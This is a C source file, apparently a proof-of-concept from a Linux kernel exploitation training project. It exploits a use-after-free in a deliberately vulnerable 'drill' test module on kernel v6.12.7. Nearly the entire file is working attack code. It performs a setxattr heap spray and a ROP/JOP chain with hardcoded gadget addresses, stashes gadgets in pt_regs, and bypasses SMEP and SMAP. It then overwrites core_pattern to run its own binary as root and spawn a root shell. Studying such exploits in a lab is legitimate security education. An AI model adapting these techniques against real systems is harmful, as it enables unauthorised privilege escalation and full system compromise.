/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit invoking a callback in the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Compile the Linux kernel without:
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * 2) Disable mitigations:
 *   - run qemu with "-cpu qemu64,+smep,+smap".
 *   - run the kernel with "nokaslr".
 *
 * 3) Check your kernel version:
 *   - head at v6.12.7 tag,
 *   319addc2ad901dac4d6cc931d77ef35073e0942f
 *
 * 4) Difference from `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF4=y
 *   - CONFIG_DEBUG_INFO_COMPRESSED_NONE=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 *  5) Compiler is gcc, version 11.4.0
 *
 * This PoC performs control flow hijack and gains LPE via `core_patter` overwriting,
 * SMEP bypassing via ROP/JOP and SMAP bypassing via two-step pivoing in the kernelspace.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <sys/user.h>
#include <err.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include "drill.h"

#define MMAP_SZ				(PAGE_SIZE * 2)
#define PAYLOAD_SZ			95

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COPY_FROM_USER_PTR 		0xffffffff8154b740UL  /* copy_from_user */
#define CORE_PATTERN_PTR 		0xffffffff82b78980UL  /* &core_pattern  */
#define MSLEEP_PTR            		0xffffffff81142800UL  /*    msleep      */

/* ROP gadgets */
#define STACKPIVOT_GADGET_PTR 		0xffffffff811d9489UL  /* add rsp, 0x1a8 ; jmp 0xffffffff81f4dd60 */
#define POP_RDX_POP_RDI 		0xffffffff8158f54fUL  /*         pop rdx ; pop rdi ; ret         */
#define POP_RSI 			0xffffffff81d1da59UL  /*              pop rsi ; ret              */

/* core_pattern stuff */
#define SYSCHK(x)                                 \
	({                                        \
		typeof(x) __res = (x);            \
		if (__res == (typeof(x))-1)       \
			err(1, "SYSCHK(" #x ")"); \
		__res;                            \
	})
static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";

/* ========================================================================== */

int do_cpu_pinning(int c)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(c, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #0\n");
	return EXIT_SUCCESS;
}

void do_ptregs_pass(void)
{
	/*
      	 * Let's abuse `pt_regs` to store arbitrary data at the bottom of the kernel stack,
     	 * and then jump to that data via STACKPIVOT_GADGET_PTR. We need this jump to
     	 * find the drill_item_t pointer stored on the stack and jump to drill_item_t on the heap.
     	 */
	__asm__(".intel_syntax noprefix;"
		"mov r14, 0xffffffff810604c4;" /* : pop rax ; ret */
		"mov r13, 0x00000000000001e0;" /* => rax */
		"mov r12, 0xffffffff810e5abc;" /* : push rsp ; pop rsi ; pop rbx ; ret */
		/* hole => dummy rbx */
		"mov rbx, 0xffffffff810040ad;" /* : pop r15 ; ret */
		/* hole => dummyy r15 */
		"mov r10, 0xffffffff813f50d5;" /* : sub rsi, rax ; mov rax, rcx ; sub rax, rsi ; ret */
		"mov r9, 0xffffffff812dcc30;" /*  : mov rax, qword ptr [rsi] ; ret */
		"mov r8, 0xffffffff814d71fa;" /* : push rax ; pop rsp ; jmp 0xffffffff814d72ad
									   <0xffffffff814d72ad> :    add    rsp,0x10
									   <0xffffffff814d72b1> :    ret */
		".att_syntax;");
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/bin/sh",
		"-i",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/bin/sh", args, NULL); /* Should not return */
		perror("[-] execve");
	} else {
		if (wait(&status) < 0)
			perror("[-] wait");

		printf("[+] /bin/sh finished\n");
	}
}

static const unsigned long rop_chain[0x60] = {
	/* free slot */ [0] =  0x01UL,
	/* hole */ [1] = 0x01UL,
	[2]  = POP_RDX_POP_RDI,
	[3]  = 0x30, /* => rdx */
	[4]  = CORE_PATTERN_PTR,
	[5]  = POP_RSI,
	/* hole => dummy rsi */ [6] = 0x01UL,
	[7]  = POP_RSI,
	[8]  = (unsigned long)&fake_core_pattern,
	[9]  = COPY_FROM_USER_PTR,
	[10] = MSLEEP_PTR,
	/* corrupted slot */ [11] = 0x01UL
};

void init_payload(char *p, size_t size)
{
	struct drill_item_t *item = (struct drill_item_t *)p;

	memset(p, 0x41, size);
	/* place 2nd set of gadgets at the drill_item_t */
	memcpy(p, rop_chain, sizeof(rop_chain));

	item->callback = (void (*)(void))STACKPIVOT_GADGET_PTR;

	printf("[+] payload:\n");
	printf("\tstart at %p\n", p);
	printf("\tcallback at %p\n", &item->callback);
	printf("\tcallback 0x%lx\n", (unsigned long)item->callback);
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	do_ptregs_pass(); /* places gadgets at the bottom of the kernel stack */
	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int check_core()
{
	/* check if /proc/sys/kernel/core_pattern has been overwritten */
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	/*
	 * Trigger program crash and cause kernel to executes program from
	 * `core_pattern` which is our "root" binary
	 */
	*(size_t *)0 = 0;
}
int main(int argc, char **argv)
{
	int result = EXIT_FAILURE;
	char *spray_data = NULL;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	int spray_fd = -1;

	if (argc > 1) {
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		if (getuid() == 0 && geteuid() == 0) {
			printf("[+] finish as: uid=0, euid=0, start sh...\n");
			result = EXIT_SUCCESS;
			run_sh();
		} else {
			printf("[-] heap spraying\n");
		}
	}
	if (fork() == 0) /* this process is used to trigger core_pattern exploit */
	{
		if (do_cpu_pinning(1) == EXIT_FAILURE)
			goto end;
		setsid();
		crash("");
	}
	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	/*
	 * Prepare
	 */
	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (spray_data == MAP_FAILED) {
		perror("[-] mmap");
		goto end;
	}

	init_payload(spray_data, MMAP_SZ);

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	spray_fd = open("./foobar", O_CREAT, S_IRUSR | S_IWUSR);
	if (spray_fd < 0) {
		perror("[-] open failed");
		goto end;
	}

	printf("[+] spray_fd is opened\n");

	if (act(act_fd, DRILL_ACT_ALLOC, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_ALLOC\n");

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

	/*
	 * Exploit
	 */

	if (act(act_fd, DRILL_ACT_FREE, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_FREE\n");

	ret = setxattr("./", "foobar", spray_data, PAYLOAD_SZ, 0);
	printf("[+] setxattr is called (returned %d)\n", ret);

	/*
	 * During a control flow hijack, the kernel often crashes with a double fault error.
	 * This happens when the time slice ends and the exploit process is preempted by another process.
	 * Let's call sched_yield() to make control flow hijacking more stable.
	 * This function frees up the current CPU for other tasks, causing the ROP chain to
	 * execute from the new scheduler time slice.
	 */
	if (sched_yield() < 0) {
		perror("[-] sched_yield");
		goto end;
	}

	if (act(act_fd, DRILL_ACT_CALLBACK, 3, NULL) == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_CALLBACK\n");

end:
	if (spray_fd >= 0) {
		ret = close(spray_fd);
		if (ret != 0)
			perror("[-] close spray_fd");
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (remove("./foobar") != 0)
		perror("[-] remove ./foobar");

	return result;
}
